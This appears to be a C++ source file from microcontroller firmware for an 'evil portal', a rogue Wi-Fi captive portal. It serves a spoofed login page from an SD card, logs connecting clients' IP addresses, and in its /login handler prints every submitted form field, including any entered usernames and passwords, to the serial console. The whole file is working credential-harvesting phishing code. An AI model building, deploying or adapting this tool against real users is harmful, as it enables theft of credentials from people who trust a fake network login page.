#include "evilportal.hpp"
#include "posixsd.hpp"	// Not so good. TODO: Try to remove it

FS sd_card = get_current_fs();

const char not_found[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<head>
    <title>Captive Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <h1>404 Not Found</h1>
</body>
</html>
)=====";

#ifdef CONFIG_USE_LOGIN_CALLBACK
extern void captive_portal_callback(AsyncWebServerRequest* request);
#endif

CaptiveRequestHandler::CaptiveRequestHandler()
{
    server.on(
        "/login",
        HTTP_POST,
        [](AsyncWebServerRequest *request)
        {
	#ifdef CONFIG_USE_LOGIN_CALLBACK
	    captive_portal_callback(request);
	#else
	    Serial0.printf("Enter in login page\n");
            for (size_t i = 0; i < request->args(); i++)
            {
                Serial0.printf("%s: %s\n", request->argName(i), request->arg(i));
            }

            request->send(200);
	#endif
        },
        NULL,
        NULL); 
}

CaptiveRequestHandler::~CaptiveRequestHandler() {}

void CaptiveRequestHandler::set_static_path(const char *path) {
    server.serveStatic("/", sd_card, path);
    server.on("/", HTTP_GET, [path](AsyncWebServerRequest *request){
	Serial0.printf("Client connected. Ip: %s\n", request->client()->remoteIP().toString());
	request->send(sd_card, (String)path + "/index.html", "text/html");
    });
}

bool CaptiveRequestHandler::canHandle(AsyncWebServerRequest *request)
{
    return true;
}

void CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request)
{
    Serial0.printf("Client connected. Ip: %s\n", request->client()->remoteIP().toString());
    AsyncResponseStream *response = request->beginResponseStream("text/html"); 
    response->print(not_found);
    request->send(response);
}
